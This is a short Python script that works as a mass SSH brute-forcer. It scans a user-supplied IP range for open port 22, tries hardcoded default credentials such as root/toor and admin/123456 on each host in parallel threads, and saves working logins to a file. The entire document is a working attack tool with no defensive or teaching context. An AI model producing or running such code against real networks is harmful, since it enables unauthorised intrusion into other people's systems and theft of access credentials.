import ipaddress
import socket
import paramiko
import threading
from colorama import Fore, Style

# Ask for user input of IP range
ip_range = input("Enter IP range (e.g 127.0.0.0/24, 127.0.0.0-127.0.0.255, 127.0.0.0): ")

# Convert IP range to a list of IP addresses
ip_list = []
if "/" in ip_range:
    for ip in ipaddress.IPv4Network(ip_range, strict=False):
        ip_list.append(str(ip))
elif "-" in ip_range:
    ip_range_split = ip_range.split("-")
    ip_start = ipaddress.IPv4Address(ip_range_split[0])
    ip_end = ipaddress.IPv4Address(ip_range_split[1])
    for ip_int in range(int(ip_start), int(ip_end)):
        ip_list.append(str(ipaddress.IPv4Address(ip_int)))
else:
    ip_list.append(ip_range)

# Define list of usernames and passwords to try
usernames = ["root", "admin", "ubuntu", "kali"]
passwords = ["toor", "123456", "qwerty", "kali", "admin", "debian"]

# Function to scan IP address for open port 22
def scan_ip(ip):
    try:
        # Check if port 22 is open
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, 22))
        s.close()
        
        # Attempt to log in using usernames and passwords
        for username in usernames:
            for password in passwords[:3]:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(ip, port=22, username=username, password=password)
                    print(f"{Style.BRIGHT}{Fore.GREEN}[SUCCESS] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
                    with open("logins.txt", "a") as f:
                        f.write(f"{ip} {username} {password}\n")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"{Fore.RED}[FAIL] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
                    ssh.close()
                except Exception as e:
                    ssh.close()
                    print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")

# Scan IP ranges for open port 22
threads = []
for ip in ip_list:
    t = threading.Thread(target=scan_ip, args=(ip,))
    threads.append(t)
    t.start()
for thread in threads:
    thread.join()
